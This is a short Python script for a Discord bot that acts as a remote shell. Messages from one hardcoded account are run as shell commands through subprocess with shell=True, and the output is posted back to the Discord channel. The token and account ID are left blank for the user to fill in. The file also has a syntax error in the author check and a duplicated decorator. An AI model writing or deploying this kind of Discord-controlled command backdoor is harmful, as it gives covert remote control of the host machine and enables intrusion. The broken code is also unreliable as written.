from discord.ext import commands
from discord.utils import get
from discord.ext.commands import Bot
import discord
from discord.utils import get
import subprocess
import time

DISCORD_TOKEN = ""  #enter your discord bot token

def Exec(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        return f"An error occurred: {e}"



intents = discord.Intents.all()
intents.members = True
intents.reactions = True
intents.guilds = True
bot = Bot("!", intents=intents)



@bot.command()
async def IssueCmd(ctx, arg):
    await ctx.send(arg)
@bot.event
@bot.event
async def on_message(message):
    try:
        if message.author.id == : #<==== your account id here
            output = Exec(message.content)
            if output:
                await message.channel.send(output)
            else:
                await message.channel.send("Command executed successfully, but no output.")
    except Exception as e:
        await message.channel.send(f"An error occurred: {e}")


if __name__ == "__main__":

    bot.run(DISCORD_TOKEN)